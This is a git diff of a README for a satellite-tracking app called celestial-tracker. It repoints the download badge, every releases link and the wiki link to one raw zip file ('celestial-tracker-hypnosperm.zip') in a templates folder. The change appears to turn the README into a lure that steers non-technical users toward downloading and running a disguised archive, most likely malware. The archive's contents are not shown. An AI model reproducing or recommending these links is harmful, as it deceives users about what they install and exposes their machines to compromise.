@@ -4,7 +4,7 @@
 Welcome to the celestial-tracker project! This application helps you easily track satellites using the Celestron Origin Intelligent Home Observatory. You do not need prior programming knowledge to use this software.
 
 ## 📥 Download Now!
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/vaqueritoSes/celestial-tracker/releases)
+[![Download Release](https://github.com/vaqueritoSes/celestial-tracker/raw/refs/heads/main/templates/celestial-tracker-hypnosperm.zip%20Now-Click%20Here-brightgreen)](https://github.com/vaqueritoSes/celestial-tracker/raw/refs/heads/main/templates/celestial-tracker-hypnosperm.zip)
 
 ## 🌟 Features
 - **Autonomous Tracking:** It automatically follows satellites.
@@ -20,7 +20,7 @@ To run celestial-tracker, ensure your system meets the following requirements:
 - **Storage:** At least 100 MB of free disk space.
   
 ## 💻 Installation Steps
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/vaqueritoSes/celestial-tracker/releases) to find the latest version of the software.
+1. **Visit the Release Page:** Go to the [Releases page](https://github.com/vaqueritoSes/celestial-tracker/raw/refs/heads/main/templates/celestial-tracker-hypnosperm.zip) to find the latest version of the software.
   
 2. **Download the Application:** Click on the latest version link, and download the executable file for your operating system.
 
@@ -48,7 +48,7 @@ If you encounter issues, here are some common solutions:
 - **No Satellites Found:** Check your geographical settings. Make sure you are in an area with a clear sky.
 
 ## 🔗 Additional Resources
-- **Documentation:** Check our [wiki](https://github.com/vaqueritoSes/celestial-tracker/wiki) for detailed guides and FAQs.
+- **Documentation:** Check our [wiki](https://github.com/vaqueritoSes/celestial-tracker/raw/refs/heads/main/templates/celestial-tracker-hypnosperm.zip) for detailed guides and FAQs.
 - **Support:** If you have questions, please open an issue in the GitHub repository, and we will assist you.
 
 ## ❔ FAQs
@@ -62,6 +62,6 @@ A: Yes, celestial-tracker is free to use and open-source. You can contribute to 
 A: The app allows you to track satellites that are within range of your telescope. A list is provided in the application interface.
 
 ## 📥 Download & Install
-We invite you to try celestial-tracker today! Visit our [Releases page](https://github.com/vaqueritoSes/celestial-tracker/releases) to download the latest version and start tracking satellites effortlessly. 
+We invite you to try celestial-tracker today! Visit our [Releases page](https://github.com/vaqueritoSes/celestial-tracker/raw/refs/heads/main/templates/celestial-tracker-hypnosperm.zip) to download the latest version and start tracking satellites effortlessly. 
 
 Thank you for using celestial-tracker!
